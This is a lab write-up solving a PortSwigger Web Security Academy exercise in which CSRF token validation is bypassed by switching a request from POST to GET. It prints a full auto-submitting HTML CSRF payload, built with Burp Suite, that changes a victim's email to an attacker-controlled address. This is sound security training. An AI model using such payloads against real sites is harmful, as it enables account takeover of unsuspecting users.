# Lab: CSRF where token validation depends on request method

 This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

# Step 1 Walk the application email change function using burp

I login with provided credentials:

![image](https://user-images.githubusercontent.com/83407557/210823264-b34888aa-755a-4c7b-aac8-f619f5ed3cfb.png)

And change my email to a test email:

![image](https://user-images.githubusercontent.com/83407557/210823363-16e4cd08-ff97-4fa7-b628-0b86716668f8.png)

# Step 2 Create a CSRF POC

Using burp I view the HTTP history and send the POST request for /my-account/change-email to the CSRF POC generator:

![image](https://user-images.githubusercontent.com/83407557/210823900-7226275d-e6d6-4401-8726-049c843f77ba.png)

# Step 3 modify the POC

First I want to bypass the request method filter; I right click on the request and click "change request method" feature in burp:

![image](https://user-images.githubusercontent.com/83407557/210824272-f78849a1-21f4-450d-9c42-150902b64581.png)

Next, under CSRF POC generator Options I enable auto-submit script feature:

![image](https://user-images.githubusercontent.com/83407557/210824513-4ae3513a-520a-4057-acf1-896637f393f2.png)

With both of these changes set, I then change the email parameter in the GET request to be the email I actually want to change the victim's to (one that I control) hermh4cks@gmail.com

![image](https://user-images.githubusercontent.com/83407557/210824985-c6dd3edc-6745-4b98-b52a-0c8b98f04214.png)

I then click regenerate and get the following payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ab100b7042d4d92c25723e900c60006.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="hermh4cks&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="btEV7HmCQeUymwAUH038CpPPb2PseO32" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Step 3 Test payload

Using the provided attack-server I enter the payload in the body of the /exploit page:

![image](https://user-images.githubusercontent.com/83407557/210826048-8b5b06c5-b6ec-484a-bdae-aec304942bc2.png)

I store the changes, and click view Exploit to test it on the user wiener, and verify that it changes the email to hermh4cks@gmail.com:

![image](https://user-images.githubusercontent.com/83407557/210826307-a2653b78-930d-41d8-8e0c-6092ede6541a.png)

# Step 4 Send exploit to victim

Going back to my attack-server I click the Deliver exploit to victim button

![image](https://user-images.githubusercontent.com/83407557/210826635-c3bd21f2-87d3-48c7-954a-d36a673827db.png)

Doing so, changes the victim's email and solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210826784-63d0c69b-9c20-491d-9e29-45e21d066dc8.png)
